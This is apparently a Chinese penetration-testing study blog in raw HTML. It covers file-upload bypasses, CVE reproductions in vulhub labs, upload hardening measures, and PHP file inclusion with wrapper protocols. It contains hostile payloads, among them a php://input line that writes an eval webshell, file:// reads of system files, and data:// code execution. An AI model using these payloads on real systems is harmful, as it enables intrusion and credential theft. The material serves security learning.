class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># GET参数00截断</span></span><br><span class=\"line\"><span class=\"comment\">// 原本逻辑</span></span><br><span class=\"line\">?road=xxx/<span class=\"number\">1</span>.php  --&gt;  <span class=\"variable\">$des</span>=xxx/<span class=\"number\">1</span>.php/xxx.jpg</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 截断逻辑</span></span><br><span class=\"line\">?road=xxx/<span class=\"number\">1</span>.php%<span class=\"number\">00</span>  --&gt;  <span class=\"variable\">$des</span>=xxx/<span class=\"number\">1</span>.php%<span class=\"number\">00</span>/xxx.jpg  --&gt;  <span class=\"variable\">$des</span>=xxx/<span class=\"number\">1</span>.php</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 文件名00截断</span></span><br><span class=\"line\"><span class=\"comment\">// 原本逻辑</span></span><br><span class=\"line\">name=<span class=\"number\">1</span>.php  --&gt;  拦截</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 00截断</span></span><br><span class=\"line\">name=<span class=\"number\">1</span>.php\\x00.jpg  --&gt;  <span class=\"variable\">$ext</span>=jpg, <span class=\"variable\">$name</span>=<span class=\"number\">1</span>.php  --&gt;  <span class=\"variable\">$filename</span>=xxx.jpg</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这里因为一个重命名操作，所以没办法使用文件名截断，那我们就只能在 <code>road</code> 参数中截断：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250807000649690.png\" alt=\"image-20250807000649690\"></p>\n</li>\n<li>\n<p>POST 00 截断</p>\n</li>\n<li>\n<p>使用 POST 将 <code>road</code> 参数传入拼接，思路和上一关一样，但是要注意，我们 <strong>使用的 00 截断是%00 解码后的结果</strong>：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// GET传参</span></span><br><span class=\"line\">http:<span class=\"comment\">//xxx/upload/1.php%00.jpg</span></span><br><span class=\"line\">这里使用的%<span class=\"number\">00</span>它会自动解码一次</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// POST传参</span></span><br><span class=\"line\">http:<span class=\"comment\">//xxx</span></span><br><span class=\"line\">upload/<span class=\"number\">1</span>.php%<span class=\"number\">00</span>.jpg</span><br><span class=\"line\">这里使用的%<span class=\"number\">00</span>需要我们手动进行一次解码才能够正确截断！</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>所以我们这里直接添加%00 它是不行的，需要手动 URL 解码一次</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250807000924516.png\" alt=\"image-20250807000924516\"></p>\n</li>\n<li>\n<p>解码之后这里就像消失了一样，但实际上并没有，发包访问，成功解析</p>\n</li>\n</ul>\n<h5 id=\"9-二次渲染\">9.二次渲染</h5>\n<ul>\n<li>\n<p>有些网站在我们上传图片后，会对图片进行处理，二次渲染到前端页面，这个过程会导致上传的图片与原先的图片上的信息不一致，因此图片马可能会失效，我们可以将木马写到网站不会处理的地方，绕过处理实现文件上传漏洞</p>\n</li>\n<li>\n<p>比如，我上传一个正常的文件，它渲染到前端之后我们将其下载下来比较前后的文件大小：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250807001349264.png\" alt=\"image-20250807001349264\"></p>\n</li>\n<li>\n<p>可以看到啊两个文件的大小差距非常大，说明服务器对文件做了压缩删减了，这时我们拿出 <code>010Editor</code> 进行分析：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250807001413969.png\" alt=\"image-20250807001413969\"></p>\n</li>\n<li>\n<p>选择右上角的比较文件，然后选择两个文件，点击比较：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250807001436297.png\" alt=\"image-20250807001436297\"></p>\n</li>\n<li>\n<p>就可以看到两个文件的差异了：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250807001510074.png\" alt=\"image-20250807001510074\"></p>\n</li>\n<li>\n<p>我们选择比较他们相同的部分，看看哪里没有被服务器删除：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250807001537468.png\" alt=\"image-20250807001537468\"></p>\n</li>\n<li>\n<p>现在标蓝色的位置就是他们的匹配项，也就是没有改变的地方，那我们可以选择将一句话木马写到这些位置：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250807001611407.png\" alt=\"image-20250807001611407\"></p>\n</li>\n<li>\n<p>因为这个靶场有文件包含漏洞，我们利用这个，访问我们上传的图片马，并在 post 上连接我们的密码进行系统命令</p>\n</li>\n<li>\n<p>成功执行！</p>\n</li>\n</ul>\n<h5 id=\"10-函数缺陷绕过\">10.函数缺陷绕过</h5>\n<ul>\n<li>\n<p>在 PHP 5.3.4 以下的版本（不确定），move_uploaded_file($temp_file, $ img_path)函数存在解析漏洞。 如果网站使用了该函数，并且允许用户对上传文件进行重命名，那么可以通过该漏洞尝试绕过黑名单后缀名检测，造成文件上传漏洞。</p>\n</li>\n<li>\n<p>这里我们给出源码提示，然后我们可以控制上传文件名，但这里 php 版本不适合用 00 截断</p>\n</li>\n<li>\n<p>所以我们可以利用 <code>move_uploaded_file()</code> 的函数缺陷，如果上传的文件名最后存在 <code>/.</code>，那么就它实际命名时就会当成 <code>/</code> 前面的部分，从而绕过黑名单检测：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250807002032805.png\" alt=\"image-20250807002032805\"></p>\n</li>\n<li>\n<p>成功解析！</p>\n</li>\n</ul>\n<h4 id=\"二、漏洞复现（中间件-第三方组件）\">二、漏洞复现（中间件&amp;第三方组件）</h4>\n<h5 id=\"1-Apache-HTTPD-换行解析漏洞（CVE-2017-15715）\">1.Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h5>\n<ul>\n<li>\n<p>Apache HTTPD 是一款 <a href=\"https://so.csdn.net/so/search?q=HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8&amp;spm=1001.2101.3001.7020\">HTTP 服务器</a>，它可以通过 mod_php 来运行 PHP 网页。</p>\n</li>\n<li>\n<p><strong>漏洞影响版本</strong>：<code>2.4.0</code>~<code>2.4.29</code></p>\n</li>\n<li>\n<p><strong>漏洞描述</strong>：在解析 PHP 时，<code>1.php\\x0A</code> 将被按照 PHP 后缀进行解析，导致绕过一些服务器的安全策略</p>\n</li>\n<li>\n<p><strong>漏洞利用条件</strong>：</p>\n<ul>\n<li>Apache 版本符合</li>\n<li>存在文件上传点</li>\n<li>能够自定义服务器保存文件名</li>\n</ul>\n</li>\n<li>\n<p>可以看到这个利用条件也是非常苛刻，所以只当了解原理即可，实战很难遇到</p>\n</li>\n<li>\n<p><strong>漏洞复现</strong>：<code>docker</code> 启动 <code>vulhub</code> 环境，漏洞地址：<code>/vulhub/httpd/CVE-2017-15715</code></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808121625428.png\" alt=\"image-20250808121625428\"></p>\n</li>\n<li>\n<p>通过指纹识别到服务器为 <code>Apache 2.4.10</code>，符合漏洞版本：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808121729486.png\" alt=\"image-20250808121729486\"></p>\n</li>\n<li>\n<p>然后上传一个 <code>1.php</code> 文件，抓包转到 <code>Repeater</code> 模块：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808121809236.png\" alt=\"image-20250808121809236\"></p>\n</li>\n<li>\n<p>正常上传 <code>php</code> 文件是无法上传的，提示 <code>bad file</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808121931519.png\" alt=\"image-20250808121931519\"></p>\n</li>\n<li>\n<p>然后我们在上传重命名的文件名 <code>evil.php</code> 处加一个空格，方便我们之后十六进制更改</p>\n</li>\n<li>\n<p>转到十六进制，将刚刚添加的空格处（<code>0x20</code>）改为 <code>0x0A</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808122004084.png\" alt=\"image-20250808122004084\"></p>\n</li>\n<li>\n<p>然后上传，可以看到没有错误提示，说明上传成功：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808122057059.png\" alt=\"image-20250808122057059\"></p>\n</li>\n<li>\n<p>之后访问 <code>/evil.php%0a</code> 即可访问到我们上传的 <code>php</code>：</p>\n</li>\n<li>\n<p>成功解析</p>\n</li>\n</ul>\n<h5 id=\"2-Nginx-文件名逻辑漏洞（CVE-2013-4547）\">2.Nginx 文件名逻辑漏洞（CVE-2013-4547）</h5>\n<ul>\n<li>\n<p>Nginx 是一个 <a href=\"https://so.csdn.net/so/search?q=Web%E6%9C%8D%E5%8A%A1%E5%99%A8&amp;spm=1001.2101.3001.7020\">Web 服务器</a>，可用作反向代理、负载均衡器、邮件代理和 HTTP 缓存。</p>\n</li>\n<li>\n<p><strong>漏洞影响版本</strong>：<code>Nginx</code> <code>0.8.41</code> <code>1.4.3</code>/<code>1.5.0</code> <code>1.5.7</code></p>\n</li>\n<li>\n<p>漏洞描述：这个漏洞主要是请求 URL 的解析不正确，导致用户请求的文件名检索不正确，从而导致权限绕过和代码执行。当 Nginx 匹配到.php 结尾的请求时，才会发送给 fastcgi 进行解析，但是当我们请求 1.gif [0x20][0x00].php 时，这个 URL 可以匹配上正则.php$，也能够解析为 php 文件。因此我们只需要上传一个空格结尾的文件，即可使其解析为 PHP 文件</p>\n</li>\n<li>\n<p><strong>漏洞复现</strong>：启动 <code>vulhub</code> 靶场，地址为：<code>/vulhub/nginx/CVE-2013-4547</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808135618059-1754632578686-1.png\" alt=\"\"></p>\n</li>\n<li>\n<p>然后我们将 <code>php</code> 文件改成 <code>gif</code> 上传，抓包转到 <code>Repeater</code> 模块：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808135805175-1754632685845-3.png\" alt=\"image-20250808135805175\"></p>\n</li>\n<li>\n<p>然后将文件名 <code>1.gif</code> 后面加两个空格（<code>0x20</code>）转到十六进制编辑，找到我们添加的空格处，将第二个 <code>0x20</code> 改为 <code>0x00</code>：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808135831161.png\" alt=\"image-20250808135831161\"></p>\n</li>\n<li>\n<p>然后发包：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808135903680.png\" alt=\"image-20250808135903680\"></p>\n</li>\n<li>\n<p>成功上传，复制上传路径，然后访问再次抓包：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808135955581.png\" alt=\"image-20250808135955581\"></p>\n</li>\n<li>\n<p>转到 <code>Repeater</code> 模块，重复刚才的操作在 <code>1.gif</code> 后面添加两个空格以及 <code>.php</code>，然后转到十六进制将第二个空格改为 <code>0x00</code>，然后发包：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808140019928.png\" alt=\"image-20250808140019928\"></p>\n</li>\n<li>\n<p>成功解析成 php 文件</p>\n</li>\n</ul>\n<h5 id=\"3-Nginx-解析漏洞\">3.Nginx 解析漏洞</h5>\n<ul>\n<li>\n<p><strong>漏洞影响版本</strong>：全版本</p>\n</li>\n<li>\n<p><strong>漏洞描述</strong>：该漏洞与 Nginx、PHP 版本无关，属于 <strong>用户配置不当造成</strong> 的解析漏洞。该漏洞存在的原因是 Nginx 在配置中对文件扩展名的处理方式。<strong>当请求一个具有多个扩展名的文件</strong>（如 <code>file.jpg.php</code>）时，Nginx 可能会 <strong>根据最后一个扩展名来处理</strong></p>\n<figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">location</span> <span class=\"regexp\">~ \\.php$</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">fastcgi_pass</span>   <span class=\"number\">127.0.0.1:9000</span>;</span><br><span class=\"line\">    <span class=\"attribute\">fastcgi_index</span>  index.php;</span><br><span class=\"line\">    <span class=\"attribute\">fastcgi_param</span>  SCRIPT_FILENAME  /var/www/html<span class=\"variable\">$fastcgi_script_name</span>;</span><br><span class=\"line\">    <span class=\"attribute\">include</span>        fastcgi_params;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong>漏洞复现</strong>：启动 <code>vulhub</code> 靶场，地址为：<code>/vulhub/nginx/nginx_parsing_vulnerability</code></p>\n</li>\n<li>\n<p>我们上传一个正常的 <code>gif</code> 文件，然后在最末尾添加 <code>php</code> 代码：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808155932083-1754639973625-5.png\" alt=\"image-20250808155932083\"></p>\n</li>\n<li>\n<p>发包上传，得到上传路径：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808160017849.png\" alt=\"image-20250808160017849\"></p>\n</li>\n<li>\n<p>直接访问没有问题，但是我们在后面加上一个/.php 后缀，他就会将其解析成 php 文件</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808160134600.png\" alt=\"image-20250808160134600\"></p>\n</li>\n<li>\n<p>成功解析！</p>\n</li>\n</ul>\n<h5 id=\"4-编辑器-上传相关-第三方处理引用\">4.编辑器&amp;上传相关&amp;第三方处理引用</h5>\n<ul>\n<li>这一部分产生文件上传的原因就是由于程序或网站引用第三方的组件，最常见的就是编辑器，像 <code>ueditor</code>、<code>kindeditor</code>、<code>fckeditor</code> 等</li>\n<li><strong>引用到外部的第三方编辑器实现文件上传，编辑器的安全即使上传安全</strong></li>\n<li>但是由于现在编辑器的漏洞越来越少，而且很多都不采用编辑器组件，所以实战碰到的机会不大，主要是理解漏洞产生的思路</li>\n<li>参考文章：\n<ul>\n<li><a href=\"https://cloud.tencent.com/developer/article/2200036\">渗透测试-Ueditor 漏洞捡漏-腾讯云开发者社区-腾讯云</a></li>\n<li><a href=\"https://blog.csdn.net/qq_45813980/article/details/126866682\">常见编辑器漏洞汇总【超全】（转载）-CSDN 博客</a></li>\n<li><a href=\"https://blog.csdn.net/zkaqlaoniao/article/details/137669500\">实战纪实 | 编辑器漏洞之 Ueditor-任意文件上传漏洞 （老洞新谈）_ueditor 漏洞-CSDN 博客</a></li>\n</ul>\n</li>\n</ul>\n<h5 id=\"5-CMS-源码-上传相关-已知识别到利用\">5.CMS 源码&amp;上传相关&amp;已知识别到利用</h5>\n<ul>\n<li>有的网站也会直接采用第三方的 CMS，比如一些第三方的 OA 系统：泛微、通达、用友等等</li>\n<li>那这时候我们就是已知 CMS 源码架构，一般自己挖出或审出漏洞的几率是极小的</li>\n<li>所以遇到这类网站，我们一般就是尝试去看看是否有已知的漏洞可以利用</li>\n</ul>\n<h5 id=\"6-通达-OA-任意文件上传\">6.通达 OA 任意文件上传</h5>\n<ul>\n<li>\n<p>这里的演示环境是通达 OA-V11.2 版本，这里建议是安装到刚刚的虚拟机环境中</p>\n</li>\n<li>\n<p>安装完之后就直接配置</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808162734345.png\" alt=\"image-20250808162734345\"></p>\n</li>\n<li>\n<p>等它安装完之后就可以直接访问了</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808162825169.png\" alt=\"image-20250808162825169\"></p>\n</li>\n<li>\n<p>对于这类公开的 CMS，我们可以信息收集到它的版本这些，然后到网上搜一下是否有对应的漏洞</p>\n</li>\n<li>\n<p>或者直接利用专门的漏洞扫描工具直接开扫即可，比如这里 One-Fox 上就有 <code>Liqun</code> 工具可以扫描：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808162903863.png\" alt=\"image-20250808162903863\"></p>\n</li>\n<li>\n<p>这里扫到了存在文件上传漏洞，然后也成功上传了 shell，直接连就好了</p>\n</li>\n</ul>\n<h4 id=\"三、安全上传\">三、安全上传</h4>\n<h5 id=\"1-目录权限\">1.目录权限</h5>\n<ul>\n<li>在文件属性安全那里将读写权限取消，那么不管他传什么样的后门，都执行不了，访问 403</li>\n<li>这种情况有小概率能绕过，需要将文件上传到有读写权限的地方</li>\n</ul>\n<h5 id=\"2-字节流传输数据\">2.字节流传输数据</h5>\n<ul>\n<li>\n<p>如果网站选用字节流传输的方式，那么不管我们传什么类型的文件，他只 <strong>接受文件数据==，然后按照后端 ==定义好的安全协议进行解析</strong>，假如它定义的只接受图片，那么即使我们上传 php 也会强制解析成图片（解析后的是破损的，什么用都没有），只有上传图片才会正确解析</p>\n</li>\n<li>\n<p>最常见的例子就是在图片上传点，我将图片转为字节流，然后采用 Base64 编码传输到后端，后端添加协 <code>data:image/png;base64</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 上传图片 --&gt; 图片数据 --&gt; Base64值</span><br><span class=\"line\">2. 显示图片 --&gt; Base64值 --&gt; 解码解析还原</span><br><span class=\"line\">3. 固定协议解析上传文件 --&gt; 即使有上传漏洞也无法利用</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>后端处理的关键代码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$base64Data</span> = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$tmpFilePath</span>));</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>上传一个图片：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808215748732.png\" alt=\"image-20250808215748732\"></p>\n</li>\n<li>\n<p>它上传的格式是下面所示的 <a href=\"https://so.csdn.net/so/search?q=Base64%E7%BC%96%E7%A0%81&amp;spm=1001.2101.3001.7020\">Base64 编码</a> 值，然后解码之后正常显示</p>\n</li>\n<li>\n<p>而上传 php 文件之后是这个样子</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250808215841711.png\" alt=\"image-20250808215841711\"></p>\n</li>\n<li>\n<p>可以看到，即使上传成功，也解析不了</p>\n</li>\n</ul>\n<h5 id=\"3-分站存储\">3.分站存储</h5>\n<ul>\n<li>\n<p>文件和源码存储到不同的服务器，该服务器仅用于存储文件，所以即使我们成功上传后门，得到的也不是目标网站权限，而且一般这种分站存储都是配合目录权限操作的，我们的木马大概率链存储文件的地方都连不上去</p>\n</li>\n<li>\n<p>将上传的文件和网站源码分开放，但仍处于同一服务器，结构如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">服务器A</span><br><span class=\"line\">├── root/                 </span><br><span class=\"line\">│   ├── www/              # 网站源码目录</span><br><span class=\"line\">│   │   ├── static/          </span><br><span class=\"line\">│   │   ├── app/</span><br><span class=\"line\">│   │   │   └──index.php</span><br><span class=\"line\">│   │   └── templates/</span><br><span class=\"line\"></span><br><span class=\"line\">服务器B</span><br><span class=\"line\">├── upload/               # 文件上传目录</span><br><span class=\"line\">│   ├── 1.php</span><br><span class=\"line\">│   └── 1.jpg</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"4-OSS-云存储\">4.OSS 云存储</h5>\n<ul>\n<li>利用云厂商的 OSS 技术，将文件存储到 Bucket 桶中，OSS 对象存储的文件只做存储，不做处理，访问的时候它 <strong>要么下载</strong>，<strong>要么查看</strong>，压根不会执行，即使它执行了，你也是在和云厂商对抗，而不是目标网站，所以上传 shell 基本没有啥用了</li>\n</ul>\n<h5 id=\"5-总结\">5.总结</h5>\n<ul>\n<li>遇到这四个尽快跑路，基本上传失败或者连不上去，也就第一个能有小概率绕过，但概率很小</li>\n</ul>\n<h3 id=\"文件包含-2\">文件包含</h3>\n<h4 id=\"一、基础知识\">一、基础知识</h4>\n<ul>\n<li>\n<p>原理：程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为文件包含。</p>\n</li>\n<li>\n<p>在文件包含的过程中，如果文件能进行控制，则存在文件包含漏洞</p>\n</li>\n<li>\n<p>在 PHP 中，关于文件包含的函数有：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">include</span>()</span><br><span class=\"line\"><span class=\"keyword\">include_once</span>()</span><br><span class=\"line\"><span class=\"keyword\">require</span>()</span><br><span class=\"line\"><span class=\"keyword\">require_once</span>()</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>如果上述传入的这些函数的 <strong>参数可控</strong>，那么就有可能存在文件包含漏洞</p>\n</li>\n<li>\n<p>文件包含漏洞分为两大类：</p>\n<ul>\n<li><strong>本地包含</strong>：<code>Local File Include</code>（<code>LFI</code>），即只能包含本地拥有的文件</li>\n<li><strong>远程包含</strong>：<code>Remote File Include</code>（<code>RFI</code>），即可以加载远程文件进行包含</li>\n</ul>\n</li>\n<li>\n<p>差异原因：代码过滤或者环境配置文件开关决定</p>\n</li>\n</ul>\n<h4 id=\"二、远程文件包含\">二、远程文件包含</h4>\n<ul>\n<li>\n<p>远程文件包含必须满足的条件：</p>\n<ul>\n<li>存在包含点</li>\n<li>没有代码过滤</li>\n<li>允许远程加载并执行远程文件</li>\n</ul>\n</li>\n<li>\n<p>那么对于 PHP 而言，需要配置选项 <code>allow_url_include</code> 和 <code>allow_url_fopen</code> 为 <code>ON</code> 状态，在小皮中，就要将远程文件和远程包含开启：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250809190015615.png\" alt=\"image-20250809190015615\"></p>\n</li>\n<li>\n<p>不过这个默认是关闭的，实战中很少碰到</p>\n</li>\n</ul>\n<h4 id=\"三、本地文件包含\">三、本地文件包含</h4>\n<ul>\n<li>比起 <code>RFI</code>，<code>LFI</code> 的利用条件就简单了很多，只需要有包含点即可</li>\n<li>本地文件包含分为两大类：\n<ul>\n<li>有文件包含：配合文件上传，实现包含自定义文件</li>\n<li><strong>无文件利用</strong>：\n<ul>\n<li>包含日志文件利用</li>\n<li>包含 Session 文件利用</li>\n<li>伪协议利用</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"四、伪协议\">四、伪协议</h4>\n<h5 id=\"1-基础知识\">1.基础知识</h5>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250809190554685.png\" alt=\"image-20250809190554685\"></p>\n<ul>\n<li>\n<p>主要协议有 <code>file://</code>、<code>php://filter</code>、<code>php://input</code>、<code>zip://</code>、<code>data://</code> 等等</p>\n</li>\n<li>\n<p>参考文章：<a href=\"https://segmentfault.com/a/1190000018991087\">PHP 伪协议总结 - 个人文章 - SegmentFault 思否</a></p>\n</li>\n<li>\n<p>文件读取：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 读取/etc/password文件，使用绝对路径！</span></span><br><span class=\"line\">file:///etc/password</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取phpinfo.php文件，并进行base64编码，使用相对路径！</span></span><br><span class=\"line\">php://<span class=\"built_in\">filter</span>/read=convert.base64-encode/resource=phpinfo.php</span><br><span class=\"line\"></span><br><span class=\"line\">file:///var/log/nginx/access.log <span class=\"comment\">#日志读取</span></span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>文件写入：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 写入phpinfo.php文件，并进行base64编码 =&gt; 需要配合file_put_contents()函数使用</span></span><br><span class=\"line\">php://<span class=\"built_in\">filter</span>/write=convert.base64-encode/resource=phpinfo.php</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># POST提交代码创建shell.php文件</span></span><br><span class=\"line\">php://<span class=\"built_in\">input</span> POST:&lt;?php fputs(fopen(<span class=\"string\">&#x27;shell.php&#x27;</span>,<span class=\"string\">&#x27;w&#x27;</span>),<span class=\"string\">&#x27;&lt;?php @eval($_GET[cmd]);?&gt;&#x27;</span>); ?&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>代码执行：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># POST提交php代码</span></span><br><span class=\"line\">php://<span class=\"built_in\">input</span> POST:&lt;?php phpinfo();?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 执行php代码</span></span><br><span class=\"line\">data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 执行base64编码后的php代码</span></span><br><span class=\"line\">data://text/plain;base64,PD9waHAgcGwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"2-黑盒利用-vulnweb-有无文件包含\">2.黑盒利用-vulnweb-有无文件包含</h5>\n<ul>\n<li>\n<p>黑盒发现主要通过观察参数传递的数据和文件名是否对应</p>\n</li>\n<li>\n<p>我们有这样一个网站： <a href=\"http://testphp.vulnweb.com/showimage.php\">http://testphp.vulnweb.com/showimage.php</a></p>\n</li>\n<li>\n<p>现在它可以传入一个参数 <code>file</code> 去包含一个文件，现在我们就是一个黑盒，我们就可以尝试传入 <code>?file=showimage.php</code> 看看能否包含当前文件：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250809191732461.png\" alt=\"image-20250809191732461\"></p>\n</li>\n<li>\n<p>能够成功返回 <code>showimage.php</code> 的源码，一般来说网站的首页文件都是 <code>index.php</code>，那我们尝试包含一下：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250809191809527.png\" alt=\"image-20250809191809527\"></p>\n</li>\n<li>\n<p>成功返回信息，同时，这里也暴露出了数据库配置文件的文件名，直接包含一下：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250809194232548.png\" alt=\"image-20250809194232548\"></p>\n</li>\n<li>\n<p>成功得到数据库的账号和密码，接管数据库</p>\n</li>\n<li>\n<p>那这个靶场到这里就结束了，后续利用实战中可以尝试连数据库，或者利用伪协议上传马子都是 OK 的</p>\n</li>\n</ul>\n<h5 